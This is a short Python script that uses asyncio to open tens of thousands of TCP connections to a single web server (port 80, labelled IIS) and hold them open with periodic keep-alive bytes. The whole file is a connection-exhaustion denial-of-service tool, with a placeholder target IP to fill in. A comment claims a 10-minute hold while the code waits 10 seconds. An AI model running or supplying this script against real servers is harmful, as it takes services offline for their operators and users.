import asyncio
import socket

async def create_and_keep_alive_connection(target_ip, target_port, connection_id, interval):
    try:
        reader, writer = await asyncio.open_connection(target_ip, target_port)
        print(f"Connection {connection_id} established")

        while True:
            try:
                writer.write(b'KEEP_ALIVE')
                await writer.drain()
                print(f"Sent keep-alive to connection {connection_id}")
            except Exception as e:
                print(f"Failed to send keep-alive to connection {connection_id}: {e}")
                break
            await asyncio.sleep(interval)
    except Exception as e:
        print(f"Failed to establish connection {connection_id}: {e}")
    finally:
        try:
            writer.close()
            await writer.wait_closed()
            print(f"Connection {connection_id} closed")
        except Exception as e:
            print(f"Failed to close connection {connection_id}: {e}")

async def main():
    target_ip = "10.224.1.134"  # Replace with the target IP
    target_port = 80            # IIS port
    max_connections = 65565
    keep_alive_interval = 30    # seconds

    tasks = []
    for i in range(max_connections):
        task = asyncio.create_task(create_and_keep_alive_connection(target_ip, target_port, i+1, keep_alive_interval))
        tasks.append(task)
        await asyncio.sleep(0.01)

    try:
        await asyncio.sleep(10)  # Keep connections alive for 10 minutes
    except asyncio.CancelledError:
        print("Interrupted by user")

    for task in tasks:
        task.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)
    print("All connections closed")

if __name__ == "__main__":
    asyncio.run(main())
